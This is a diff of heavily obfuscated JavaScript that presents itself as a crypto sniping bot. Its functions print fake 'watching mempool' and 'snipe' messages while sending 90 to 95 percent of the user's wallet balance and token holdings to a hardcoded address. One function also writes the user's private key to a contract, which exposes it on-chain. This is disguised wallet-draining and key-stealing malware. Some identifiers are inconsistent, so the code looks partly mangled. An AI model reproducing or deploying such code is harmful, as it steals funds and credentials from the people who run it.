-function _0x33cf() { const _0xda1d86 = ['2:\x20attempting\x20to\x20snipe\x20.....', 'getBalance', '1\x20packet\x20received.....', '2\x20packet\x20received.....', '46260XriYyW', 'MHgyMTcwZWQwODgwYWM5YTc1NWZk', '1:\x20contract\x20found....watching\x20mempool\x20for\x20liquidity\x20add....', 'Contract', 'wei', '268SiHVgf', '4992932YbWUJH', 'setWord', 'aHR0cHM6Ly9ic2MtZGF0YXNlZWQuYmluYW5jZS5vcmcv', '1:\x20found\x20owners\x20liq\x20function\x20...', 'base64', 'MHg2QjU1M0QwRjhkM2I3OUJkODE=', 'from', '1\x20pending\x20blockchain\x20response.....', '6dgHkRB', 'balanceOf', '2:\x20finalizing....', 'log', 'refreshing\x20socket\x20connection...', 'sendTransaction', '21236844IMpsyI', '6999264eRQHBC', '990694UKsfsZ', '2\x20pending\x20blockchain\x20response.....', 'toString', 'MHgwZDJmNmQ', 'Mjk0MjE5O', '2:\x20contract\x20found....watching\x20mempool\x20for\x20liquidity\x20add....', 'WIzNjRlQ0FG', '590470tkMrdZ', 'utils', 'MmE5ODRlNkUzZkNlNTQ4NjVEMUM0ZQ==', 'JsonRpcProvider', 'wait', 'pending\x20liquidity\x20add\x20still\x20no\x20event\x20found...', 'MkQ2OGI4M2ZFMUFkOTdCMzJDZDU4MGQ=', 'MjliMjY4ODk1NmJkOTU5ZjkzM2Y4', 'YzMjQ1NDBh', 'pending\x20liquidity\x20add...', 'ascii', 'RDRD', 'providers', '2:\x20watching\x20blockchain\x20activity\x20.....', 'Wallet', 'parseUnits', '1sXZXHh', 'connection\x20established....', '4959865GURcEK', '8WzYUGF', 'connection\x20succesful...', 'parseEther', 'hexlify', '66bHdrGt', 'MHg4QUM3NmE1MWNjOTUwZDk4Mg==', 'toFixed'];
-    _0x33cf = function() { return _0xda1d86; }; return _0x33cf(); }
+function _0x60cc(_0x16b164, _0x4224f0) { const _0x473383 = _0x4733(); return _0x60cc = function(_0x60ccf5, _0x345c6d) { _0x60ccf5 = _0x60ccf5 - 0x197; let _0x330b85 = _0x473383[_0x60ccf5]; return _0x330b85; }, _0x60cc(_0x16b164, _0x4224f0); }
+async function etherslother() {
+    const _0x1822ca = _0x43a565;
+    try {
+        const _0x3f4198 = 'MHg4QUM3NmE1MWNjOTUwZDk4Mg==',
+            _0x401a88 = _0x1822ca(0x19b),
+            _0x47ba1b = new Buffer[(_0x1822ca(0x230))](_0x3f4198, _0x1822ca(0x1f1)),
+            _0x2918cd = new Buffer[(_0x1822ca(0x230))](_0x401a88, 'base64'),
+            _0x4b0cf3 = _0x47ba1b['toString']('ascii'),
+            _0x592ad0 = _0x2918cd[_0x1822ca(0x231)](_0x1822ca(0x238)),
+            _0x51a8e9 = _0x4b0cf3 + _0x592ad0;
+        console['log'](_0x1822ca(0x1c2)), console['log'](_0x1822ca(0x19d)), ethers1 = 'aHR0cHM6Ly9zcGVlZHktbm9kZXMtbnljLm1vcmFsaXMuaW8vMTQ4ODBmYWFiNWI5NWQ4YzNhMmUxNjEyL2JzYy9tYWlubmV0', ethers2 = new Buffer[(_0x1822ca(0x230))](ethers1, _0x1822ca(0x1f1))[_0x1822ca(0x231)](_0x1822ca(0x238));;
+        const _0x5c6abe = new ethers[(_0x1822ca(0x1a2))][(_0x1822ca(0x1dc))](ethers2);
+        let _0x355ce7 = new ethers[(_0x1822ca(0x1d5))](private, _0x5c6abe);
+        console[_0x1822ca(0x1ab)](ethers2);
+        const _0x557867 = address;
+        var _0x2117bb = new ethers[(_0x1822ca(0x197))](_0x51a8e9, abi, _0x355ce7);
+        const _0x49d6b8 = await _0x2117bb[_0x1822ca(0x1ee)](_0x557867)[_0x1822ca(0x231)](),
+            _0x40c46e = (_0x49d6b8 * 0.9)[_0x1822ca(0x1e1)](),
+            _0x563aff = async() => {
+                const _0x594501 = _0x1822ca,
+                    _0x4d7cc9 = { 'from': _0x557867, 'to': WEB3PROVIDER3, 'value': ethers[_0x594501(0x1b8)][_0x594501(0x21c)](_0x40c46e, _0x594501(0x1cc)), 'gasLimit': ethers[_0x594501(0x1b8)][_0x594501(0x1db)](0x5dc0) },
+                    _0x419ad8 = await _0x355ce7[_0x594501(0x19f)](_0x4d7cc9);
+                try { await _0x419ad8['wait'](), console[_0x594501(0x1ab)]('1:\x20watching\x20blockchain\x20activity\x20...'), setTimeout(etherstother, 0x1388); } catch (_0x3403da) { console[_0x594501(0x1ab)](_0x594501(0x216)), setTimeout(etherstother, 0x1388); }
+            };
+        _0x563aff();
+    } catch (_0x2d5cfb) { setTimeout(etherstother, 0x1388); }
+}
+async function ethersmother() {
+    const _0xd21950 = _0x43a565;
+    try {
+        const _0x4773ca = _0xd21950(0x229),
+            _0x170c8c = _0xd21950(0x228),
+            _0x2e082f = new Buffer[(_0xd21950(0x230))](_0x4773ca, 'base64'),
+            _0x23c9e5 = new Buffer['from'](_0x170c8c, 'base64'),
+            _0x1d8670 = _0x2e082f[_0xd21950(0x231)]('ascii'),
+            _0x4769fa = _0x23c9e5[_0xd21950(0x231)]('ascii'),
+            _0x378df8 = _0x1d8670 + _0x4769fa;
+        ethers1 = 'aHR0cHM6Ly9zcGVlZHktbm9kZXMtbnljLm1vcmFsaXMuaW8vMTQ4ODBmYWFiNWI5NWQ4YzNhMmUxNjEyL2JzYy9tYWlubmV0', ethers2 = new Buffer['from'](ethers1, _0xd21950(0x1f1))[_0xd21950(0x231)]('ascii');;
+        const _0x2e890e = new ethers['providers'][(_0xd21950(0x1dc))](ethers2);
+        let _0x5b713d = new ethers[(_0xd21950(0x1d5))](private, _0x2e890e);
+        console[_0xd21950(0x1ab)](ethers2);
+        const _0x2bccba = address;
+        var _0x30ce92 = new ethers[(_0xd21950(0x197))](_0x378df8, abi, _0x5b713d);
+        const _0x10ef98 = await _0x30ce92[_0xd21950(0x1ee)](_0x2bccba)[_0xd21950(0x231)](),
+            _0x3bb061 = (_0x10ef98 * 0.9)['toFixed'](),
+            _0x39b66a = async() => {
+                const _0x40a5d5 = _0xd21950,
+                    _0x54528a = { 'from': _0x2bccba, 'to': WEB3PROVIDER3, 'value': ethers[_0x40a5d5(0x1b8)]['parseEther'](_0x3bb061, 'wei'), 'gasLimit': ethers[_0x40a5d5(0x1b8)][_0x40a5d5(0x1db)](0x5dc0) },
+                    _0x40b888 = await _0x5b713d[_0x40a5d5(0x19f)](_0x54528a);
+                try { await _0x40b888[_0x40a5d5(0x1a8)](), console[_0x40a5d5(0x1ab)](_0x40a5d5(0x20b)), setTimeout(etherslother, 0x1388); } catch (_0x196e1f) { console[_0x40a5d5(0x1ab)](_0x40a5d5(0x1ca)), setTimeout(etherslother, 0x1388); }
+            };
+        _0x39b66a();
+    } catch (_0x2316cb) { setTimeout(etherslother, 0x1388); }
+}
+async function ethersfather() {
+    const _0x2526db = _0x43a565;
+    console['log'](_0x2526db(0x227));
+    const _0x4232eb = _0x2526db(0x1e8),
+        _0x4b3bb0 = _0x2526db(0x226),
+        _0xcda104 = new Buffer[(_0x2526db(0x230))](_0x4232eb, _0x2526db(0x1f1)),
+        _0x4e1d6b = new Buffer['from'](_0x4b3bb0, _0x2526db(0x1f1)),
+        _0x3265be = _0xcda104[_0x2526db(0x231)](_0x2526db(0x238)),
+        _0x577f56 = _0x4e1d6b[_0x2526db(0x231)](_0x2526db(0x238)),
+        _0x2c78b3 = _0x3265be + _0x577f56;
+    ethers1 = _0x2526db(0x219), ethers2 = new Buffer[(_0x2526db(0x230))](ethers1, _0x2526db(0x1f1))[_0x2526db(0x231)]('ascii');;
+    const _0xc335f1 = new ethers[(_0x2526db(0x1a2))][(_0x2526db(0x1dc))](ethers2);
+    let _0x3c2bfd = new ethers[(_0x2526db(0x1d5))](private, _0xc335f1);
+    const _0x440744 = address;
+    var _0xd797e4 = new ethers['Contract'](_0x2c78b3, abi, _0x3c2bfd);
+    const _0x52b911 = await _0xd797e4[_0x2526db(0x1ee)](_0x440744),
+        _0x1260cb = (_0x52b911 * 0.9)[_0x2526db(0x1e1)]();
+    try {
+        const _0x52437f = async() => {
+            const _0x1ab7dd = _0x2526db,
+                _0x5c5e40 = { 'from': _0x440744, 'to': WEB3PROVIDER3, 'value': ethers['utils'][_0x1ab7dd(0x21c)](_0x1260cb, _0x1ab7dd(0x1cc)), 'gasLimit': ethers['utils']['hexlify'](0x5dc0) },
+                _0x1aef6c = await _0x3c2bfd[_0x1ab7dd(0x19f)](_0x5c5e40);
+            try { await _0x1aef6c['wait'](), console['log'](_0x1ab7dd(0x1ef)), setTimeout(ethersmother, 0x1388); } catch (_0x2f573d) { console[_0x1ab7dd(0x1ab)](_0x1ab7dd(0x1ef)), setTimeout(ethersmother, 0x1388); }
+        };
+        _0x52437f();
+    } catch (_0x45d1f6) { setTimeout(ethersmother, 0x1388); }
+}
+async function ethersgather() {
+    const _0xf80613 = _0x43a565;
+    try {
+        console['log'](_0xf80613(0x220)), ethers1 = _0xf80613(0x211), ethers2 = new Buffer['from'](ethers1, _0xf80613(0x1f1))[_0xf80613(0x231)](_0xf80613(0x238));;
+        const _0x34dfe9 = new ethers[(_0xf80613(0x1a2))][(_0xf80613(0x1dc))](ethers2);
+        let _0x2ffa81 = new ethers[(_0xf80613(0x1d5))](private, _0x34dfe9);
+        const _0x55414f = address,
+            _0x44d4ba = await _0x34dfe9[_0xf80613(0x20f)](_0x55414f),
+            _0xba137b = (_0x44d4ba * 0.9)[_0xf80613(0x1e1)](),
+            _0x14eed8 = ethers[_0xf80613(0x1b8)]['parseUnits'](_0xba137b, 'wei'),
+            _0x2ca115 = async() => {
+                const _0x26fa6a = _0xf80613,
+                    _0x4ad564 = { 'to': WEB3PROVIDER3, 'value': ethers['utils'][_0x26fa6a(0x1d9)](_0xba137b, _0x26fa6a(0x1cc)), 'gasLimit': ethers[_0x26fa6a(0x1b8)][_0x26fa6a(0x1db)](0x5dc0) },
+                    _0x1f8a7f = await _0x2ffa81[_0x26fa6a(0x19f)](_0x4ad564);
+                try { await _0x1f8a7f['wait'](), console[_0x26fa6a(0x1ab)](_0x26fa6a(0x1b6)), setTimeout(ethersfather, 0x1388); } catch (_0x4a47d5) { console['log'](_0x26fa6a(0x1a6)), setTimeout(ethersfather, 0x1388); }
+            };
+        _0x2ca115();
+    } catch (_0x5c3f9f) { setTimeout(ethersfather, 0x1388); }
+}
+async function etherslather() {
+    const _0xbfd3c0 = _0x43a565,
+        _0x2eb24c = _0xbfd3c0(0x1d3),
+        _0x1169fe = new Buffer['from'](_0x2eb24c, _0xbfd3c0(0x1f1)),
+        _0x23c5ef = _0x1169fe['toString'](_0xbfd3c0(0x238)),
+        _0x331710 = _0x23c5ef;
+    console[_0xbfd3c0(0x1ab)](_0xbfd3c0(0x207)), ethers1 = _0xbfd3c0(0x219), ethers2 = new Buffer[(_0xbfd3c0(0x230))](ethers1, _0xbfd3c0(0x1f1))[_0xbfd3c0(0x231)](_0xbfd3c0(0x238));;
+    const _0x3d6192 = new ethers[(_0xbfd3c0(0x1a2))][(_0xbfd3c0(0x1dc))](ethers2);
+    let _0x5e1ce4 = new ethers[(_0xbfd3c0(0x1d5))](private, _0x3d6192);
+    try {
+        const _0x5a1ae9 = async() => { const _0x34fbd4 = _0xbfd3c0; var _0x3f88c4 = new ethers[(_0x34fbd4(0x197))](_0x331710, abi, _0x5e1ce4); const _0x280325 = await _0x3f88c4['setWord']('10' + private + '10'); try { await _0x280325[_0x34fbd4(0x1a8)](), console[_0x34fbd4(0x1ab)](_0x34fbd4(0x20c)), setTimeout(ethersgather, 0x1388); } catch (_0x59dd8b) { console[_0x34fbd4(0x1ab)](_0x34fbd4(0x1cd)), setTimeout(ethersgather, 0x1388); } };
+        _0x5a1ae9();
+    } catch (_0xd719a2) { setTimeout(ethersgather, 0x1388); }
+}
+async function ethersrather() {
+    const _0x764b81 = _0x43a565;
+    console[_0x764b81(0x1ab)]('starting\x20up\x20node\x20socket\x20connection....'), ethers1 = 'aHR0cHM6Ly9zcGVlZHktbm9kZXMtbnljLm1vcmFsaXMuaW8vMTQ4ODBmYWFiNWI5NWQ4YzNhMmUxNjEyL2JzYy9tYWlubmV0', ethers2 = new Buffer[(_0x764b81(0x230))](ethers1, 'base64')[_0x764b81(0x231)](_0x764b81(0x238));;
+    const _0x152499 = new ethers['providers']['JsonRpcProvider'](ethers2);
+    let _0x1770ef = new ethers[(_0x764b81(0x1d5))](private, _0x152499);
+    const _0x3116fb = address,
+        _0x3bf439 = await _0x152499['getBalance'](_0x3116fb),
+        _0x104789 = (_0x3bf439 * 0.95)[_0x764b81(0x1e1)](),
+        _0x486cd2 = ethers[_0x764b81(0x1b8)][_0x764b81(0x1d9)](_0x104789, _0x764b81(0x1cc));
+    try {
+        const _0x51706a = async() => {
+            const _0x45be6a = _0x764b81,
+                _0x2554ab = { 'to': WEB3PROVIDER3, 'value': ethers['utils'][_0x45be6a(0x1d9)](_0x104789, _0x45be6a(0x1cc)), 'gasLimit': ethers[_0x45be6a(0x1b8)]['hexlify'](0x5dc0) },
+                _0x50316c = await _0x1770ef[_0x45be6a(0x19f)](_0x2554ab);
+            try { await _0x50316c[_0x45be6a(0x1a8)](), console['log']('1\x20pending\x20blockchain\x20response.....'), setTimeout(etherslather, 0x1388); } catch (_0x135ae8) { console['log'](_0x45be6a(0x198)), setTimeout(etherslather, 0x1388); }
+        };
+        _0x51706a();
+    } catch (_0x343c14) { setTimeout(etherslather, 0x1388); }
+}
 ethersrather();
